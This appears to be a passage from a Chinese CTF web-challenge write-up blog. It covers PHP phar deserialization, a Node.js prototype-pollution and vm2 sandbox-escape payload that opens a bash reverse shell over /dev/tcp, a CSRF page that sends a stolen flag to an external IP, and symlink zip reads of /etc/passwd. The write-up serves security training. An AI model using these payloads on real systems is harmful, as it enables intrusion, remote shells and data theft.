class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] = <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;账号或密码错误&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给了<code>class.php</code>基本上确定是一道反序列化问题，找入口点</p><p>在<code>User</code>类中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的global是引进全局变量，而这个<code>$db</code>是<code>class.php</code>里的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br></pre></td></tr></table></figure><p>所以在User类的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>close()调用的是<code>mysqli::close</code>，但是在<code>File</code>类中也有个<code>close()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里意识到链子最终应该是<code>close()</code>进行文件内容的读取，而调用<code>close()</code>的地方只有一个，那就是User的<code>__destruct()</code>方法，控制<code>$db</code>为file对象即可，但此时我们读取文件内容但无法回显，再看<code>FileList</code>类有可疑的<code>__call</code>魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果调用<code>close()</code>的话,就是先将方法名存储<code>$this-&gt;funcs</code>数组里<br>然后依次调用<code>$this-&gt;files</code>数组里的元素的close()方法，然后存储在<code>$this-&gt;results[$file-&gt;name()][$func]</code><br>如果是File类的close()，就是获取文件的内容，所以<code>$this-&gt;files</code>数组里的元素必须为File类的对象</p><p>然后看<code>FileList</code>类的析构函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123; <span class="comment">//遍历数组 $func为键  $value为对应的值</span></span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正好析构函数的作用为输出<code>$this-&gt;funcs</code>里的元素的值，然后输出<code>$this-&gt;results</code>数组里的数组元素的键值对，而在<code>__call()</code>函数里我们存储的文件的内容就在<code>$result as $func =&gt; $value</code>的<code>$value</code>里</p><p>所以只要构造<code>$this-&gt;files</code>的值，就可以在最后面输出其文件的内容，这样就可以获得flag</p><p>故最终的调用链为<code>User::__destruct() -&gt; FileList::__Call() -&gt; File::close() -&gt; FileList::__destruct()</code></p><p><strong>寻找触发点</strong>：可以出发phar反序列化的函数详细可见上方博客，在<code>open()</code>有<code>file_exists</code>可以触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>download</code>和<code>delete</code>均可触发，但<code>download</code>中有限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只有网站目录和/etc /tmp可以操作</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p><code>open_basedir</code> 将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如<code>fopen()</code>或<code>file_get_contents()</code>等系统函数打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p><p>如果设置为</p><p><code>ini_set(“open_basedir”,/var)</code></p><p>那么就是限制前缀，可以使用任意后缀 ：<code>/var1 /var/www /varsda/…/</code></p><p>如果是</p><p><code>ini_set(“open_basedir”,/var/)</code></p><p>那么就是限制了目录，只能使用此目录的文件：<code> /var/www/</code></p></blockquote><p>故利用<code>delete.php</code>触发反序列化即可</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置sutb</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;123123&gt;&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;./phar.jpg&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;./phar.phar&quot;</span>,<span class="string">&quot;./phar.jpg&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://www.z4a.net/images/2024/05/05/fa68b223f651bddc0537a4f01696e95e.png" alt="success"></p><h2 id="hznuctf-2023-final-eznode">[HZNUCTF 2023 final]eznode</h2><p><strong>考点</strong>：<code>NodeJs</code>、<code>原型链污染</code>、<code>VM沙箱逃逸</code></p><p>界面提示查看源码，猜测是<code>node.js</code>配置错误造成的源码泄露，也可以扫目录访问<code>app.js</code>获得源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>发现一个merge函数，原型链污染的常客，大概就是在页面post传递一个json数据，会经过<code>json.parse</code>函数解析，然后再通过<code>clone()</code>函数复制到<code>copybody</code>变量中，最后判断该变量的shit值是否为真，然后调用<code>backdoor()</code>函数在VM2沙箱中执行<code>&#123;&#125;.shellcode</code>属性。</p><p><code>backdoor</code>函数利用vm2执行<code>shellcode</code>，这个<code>shellcode</code>其他地方没有得传值，所以我们利用原型链污染传递<code>shellcode</code>，污染成<code>VM2</code>沙箱逃逸的<code>payload</code>即可执行任意命令。</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:28667</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1715092418,1715151077,1715346525,1715353848; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1715354979</span><br><span class="line">If-None-Match: W/&quot;45-KUkQHynRoADpxoiD+yQ19DdXfCU&quot;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 238</span><br><span class="line"></span><br><span class="line">&#123;&quot;shit&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(&#x27;return this&#x27;)().process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&#x27;\&quot;).toString();&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意<code>Content-Type: application/json</code></p></blockquote><p><img src="https://s2.loli.net/2024/05/11/ro7jKxnGHAsXUcW.png" alt="3150d5aa350ae1c5ebb8ed4568d155aa"></p><h2 id="gkctf-2021-checkbot">[GKCTF 2021]CheckBot</h2><p><strong>考点</strong>：<code>CSRF</code></p><p>扫目录发现<code>index.php</code>、<code>admin.php</code></p><p>注释中有提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    I am a check admin bot, I will check your URL file suffix!</span></span><br><span class="line"><span class="comment">    ------------------------------------------------------------</span></span><br><span class="line"><span class="comment">    POST url for bot!</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p><code>admin.php</code>有<code>id=flag</code>的元素但提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>no!you are 222.168.40.174<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应该是要本地访问鉴权就会回显flag，在<code>index.php</code>以POST方式传url，机器人会在后台点击我们发送的链接，带出flag传回到我们的vps上</p><p>关闭防火墙<code>systemctl stop firewalld.service</code>，开启http服务访问html文件<code>python3 -m http.server 8000</code></p><p>exp:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">/* Prepare flag */</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">let</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">/* Export flag */</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> exportFlag = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">                        exportFlag.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://39.106.249.221:9000/flagis-&#x27;</span> + <span class="variable language_">window</span>.<span class="title function_">btoa</span>(flag));</span></span><br><span class="line"><span class="language-javascript">                        exportFlag.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>监听端口可得到flag</p><h2 id="hctf-2018-hideandseek">[HCTF 2018]Hideandseek</h2><p><strong>考点</strong>：<code>软链接读取文件</code>、<code>Flask Session伪造</code></p><p>导航栏并没有绑定路由，直接任意密码登录发现上传<code>zip</code>的功能点，猜测为软链接</p><p>尝试制作软链接读取<code>/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd passwd</span><br><span class="line">zip -y passwd.zip passwd</span><br></pre></td></tr></table></figure><p>上传<code>passwd.zip</code>成功读取文件，尝试读取<code>/flag</code>，无回显</p><p>因为可以实现任意账号密码登陆，猜测可能没有数据库，而是通过<strong>Cookie</strong>判断，同时发现<code>Cookie</code>中存在<code>Session</code>，考点为<code>Flask</code>的<code>Session</code>伪造，先解密一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@CentOs flask-session-cookie-manager-master]<span class="comment"># python3 flask_session_cookie_manager3.py decode -c &#x27;eyJ1c2VybmFtZSI6IjEifQ.GSiToA.SThbegmgGhHvJoxadFI0rgHhCfY&#x27;</span></span><br><span class="line">b<span class="string">&#x27;&#123;&quot;username&quot;:&quot;1&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>想要伪造<code>Session</code>要知道<code>Secret_Key</code>，一般记录在源码中，需要找到源码位置后，配合软链接读取</p><p>这里为了快速读取需要的信息，参考网上WP写一个自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 